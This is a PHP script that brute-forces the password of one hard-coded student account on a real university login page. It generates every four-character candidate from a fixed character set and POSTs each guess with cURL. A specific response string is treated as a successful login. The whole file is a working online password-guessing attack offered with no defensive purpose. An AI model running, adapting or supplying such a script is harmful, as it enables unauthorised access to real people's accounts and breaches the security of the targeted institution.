<?php
ob_start();
/////initial values
//$uname='ghayoor';
$uname="87108832";
$pass='a055';
//ob_start();
//$p[0]=
//$pass=get_corresponding_text($p);
	if (check_exist('87108832',$pass)){
		echo 'ok: '.$pass;
}
//die('end');
ob_flush();
echo 'start';
for ($p[0]=10;$p[0]<19;$p[0]++){
for ($p[1]=0;$p[1]<36;$p[1]++){
for ($p[2]=0;$p[2]<36;$p[2]++){
for ($p[3]=0;$p[3]<36;$p[3]++){
	$pass=get_corresponding_text($p);
	if (check_exist($uname,$pass)){
		die( '<br>tagh tagh: '.$pass."<br>");
	}
	if($p[3]==0){echo $pass."#";ob_flush();}
}
}
}
}
die('end');
?>
<?php
function get_corresponding_text($ar) {
    $length = 4;
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $string = '';    

    for ($i = 0; $i < $length; $i++) {
        $string .= $characters[$ar[$i]];
    }

    return $string;
}
function check_exist($user,$pass){
	$checkpage=curl_grab_page("http://edu.sharif.edu/login.do","username=".$user."&password=".$pass."&x=115&y=16&command=login",$tt);
	$pos = strpos($checkpage,'<html dir="rtl">');
	if($pos === false) {
		return false;
	}else{
		return true;
	}
}
function curl_grab_page($url,$data,&$trueurl){
$file=dirname(__FILE__).'cookie.txt';

    $ch = curl_init();
	//curl_setopt($ch, CURLOPT_HEADER,true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $file);
    curl_setopt($ch, CURLOPT_COOKIEFILE,$file);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    curl_setopt($ch, CURLOPT_URL, $url);

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
   
	$out= curl_exec ($ch); // execute the curl command
	$trueurl=curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close ($ch);
	unset($ch);
	return $out;
}
?>